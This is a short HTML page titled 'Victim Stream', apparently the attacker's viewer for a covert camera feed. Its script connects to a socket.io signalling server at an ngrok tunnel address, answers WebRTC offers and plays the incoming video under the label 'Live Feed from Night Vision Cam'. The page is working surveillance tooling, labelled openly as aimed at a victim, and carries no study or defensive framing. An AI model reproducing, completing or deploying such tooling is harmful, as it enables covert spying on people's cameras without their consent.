<!DOCTYPE html>
<html>
<head>
  <title>Victim Stream</title>
  <style>
    body { background: black; text-align: center; }
    video { width: 90vw; max-width: 600px; margin-top: 20px; }
    h2 { color: lime; font-family: monospace; }
  </style>
</head>
<body>
  <h2>Live Feed from Night Vision Cam</h2>
  <video id="remote" autoplay playsinline controls></video>

  <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
  <script>
    const socket = io('https://cc9e-45-246-151-253.ngrok-free.app');

    const peer = new RTCPeerConnection();
    const remoteVideo = document.getElementById('remote');

    peer.ontrack = e => remoteVideo.srcObject = e.streams[0];
    peer.onicecandidate = ({candidate}) => {
      if (candidate) socket.emit('candidate', candidate);
    };

    socket.on('offer', offer => {
      peer.setRemoteDescription(offer).then(() => {
        return peer.createAnswer();
      }).then(answer => {
        peer.setLocalDescription(answer);
        socket.emit('answer', answer);
      });
    });

    socket.on('candidate', candidate => peer.addIceCandidate(candidate));
  </script>
</body>
</html>
